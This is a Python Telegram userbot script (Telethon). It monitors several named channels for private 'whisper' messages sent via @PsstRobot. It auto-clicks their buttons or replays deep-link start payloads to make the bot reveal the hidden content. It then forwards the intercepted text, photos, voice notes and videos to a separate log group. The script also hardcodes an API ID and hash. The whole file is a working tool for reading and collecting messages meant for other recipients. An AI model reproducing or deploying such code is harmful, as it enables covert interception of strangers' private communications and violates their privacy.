import asyncio
from datetime import datetime
import os
import re
import sys
import time
import traceback
from aiohttp import web
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError
from telethon.sessions import StringSession
from telethon.tl.functions.messages import GetBotCallbackAnswerRequest

# ==================== CONFIGURATION ====================
API_ID = 23782654
API_HASH = "5b001caca4f436c940fea5e060f0a3c0"
SESSION_STRING = os.environ.get("SESSION_STRING")

TARGET_CHANNELS = [
    "chatpateee", -1002133821583,
    "its_diyaa", -1004469467503,
    "UnhingedAspirand", -1003954728685,
    "channelizpublick", -1004303326817,
    "fewmehh", -1004466801780
]

WHISPER_BOT_ID = 518335359 # @PsstRobot
LOG_GROUP_ID = -1004402300724
DATA_FILE = "data.txt"

client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

# ==================== 1. CHANNEL WHISPER CLICKER & DEEP LINKER ====================
@client.on(events.NewMessage(chats=TARGET_CHANNELS))
async def whisper_clicker(event):
    if not event.buttons:
        return

    try:
        # Mark as read
        await client.send_read_acknowledge(event.chat_id, max_id=event.id)
        
        chat_name = event.chat.title if event.chat else "Target Channel"
        print(f"\n⚡ [{datetime.now().strftime('%H:%M:%S')}] Whisper Packet Received: [{chat_name}]")

        # STEP 1: Check for Deep Link (START payload) in Buttons
        found_deep_link = False
        for row in event.buttons:
            for btn in row:
                if btn.url and 'PsstRobot?start=' in btn.url:
                    # Extract payload (e.g., 1hm7u2pmue3c8=1atlu9)
                    payload = btn.url.split('start=')[-1]
                    print(f"🔗 Deep Link Payload Detected: {payload}")
                    
                    # Send /start <payload> to Bot to trigger Media
                    await client.send_message(WHISPER_BOT_ID, f"/start {payload}")
                    print("✅ /start command sent to @PsstRobot for Advanced Whisper.")
                    found_deep_link = True
                    break
        
        # STEP 2: Fallback - Try Normal Popup Click
        if not found_deep_link:
            res = await event.click(0)
            secret_text = None
            if hasattr(res, 'message') and res.message:
                secret_text = res.message
            elif isinstance(res, str):
                secret_text = res

            if secret_text and "advanced" not in secret_text.lower():
                await client.send_message(LOG_GROUP_ID, f"🔓 **Text Whisper Intercepted!**\n\n📝 **Content:** `{secret_text}`\n📍 **Source:** {chat_name}")
                print(f"✅ Text Whisper Processed.")

    except Exception as e:
        print(f"❌ Click/Link Error: {e}")

# ==================== 2. BOT PM MEDIA REDIRECTOR ====================
@client.on(events.NewMessage(from_users=WHISPER_BOT_ID))
async def bot_dm_handler(event):
    """
    Jab bot PM me media ya bada msg bhejta hai.
    """
    try:
        # Ignore startup/setup texts
        if event.message.text and any(x in event.message.text for x in ["Preparing", "Everyone", "Click the button"]):
            return
        
        # Ignore simple /start commands
        if event.message.text and event.message.text.startswith("/start"):
            return

        print(f"🔓 Advanced Whisper (Media/VN) Intercepted from Bot DM!")
        
        media_type = "Text/Media"
        if event.photo: media_type = "📷 Photo"
        elif event.voice: media_type = "🎙️ Voice Note (VN)"
        elif event.video: media_type = "🎥 Video"
        elif event.document: media_type = "📁 Document"

        current_time = datetime.now().strftime("[%d-%m-%Y %H:%M:%S]")
        
        caption = (
            f"🔓 **Advanced Whisper Intercepted!**\n\n"
            f"📝 **Type:** {media_type}\n"
            f"⏰ **Time:** `{current_time}`"
        )
        
        if event.message.text:
            caption += f"\n\n📝 **Text Content:**\n`{event.message.text}`"

        # Forward Media + Caption to Log Group
        await client.send_message(LOG_GROUP_ID, caption, file=event.message.media if event.message.media else None)
        
        # Mark as read
        await client.send_read_acknowledge(event.chat_id)
        print(f"✅ Success: Media redirected to Group!")

    except Exception as e:
        print(f"❌ DM Redirect Error: {e}")

# ==================== WEB SERVER & MAIN ====================
async def handle_ping(request): return web.Response(text="Bot is Active 24/7")

async def main():
    await client.start()
    app = web.Application(); app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app); await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 8080))).start()
    
    await client.get_dialogs()
    try:
        await client.send_message(LOG_GROUP_ID, "🚀 **Advanced Whisper Automator (Deep Link Engine) Online!**")
        print("🟢 Connection Verified!")
    except Exception: pass

    print("🔥 Bot Ready! Text, Photos, aur Voice Notes sab capture honge.")
    await client.run_until_disconnected()

if __name__ == "__main__": asyncio.run(main())
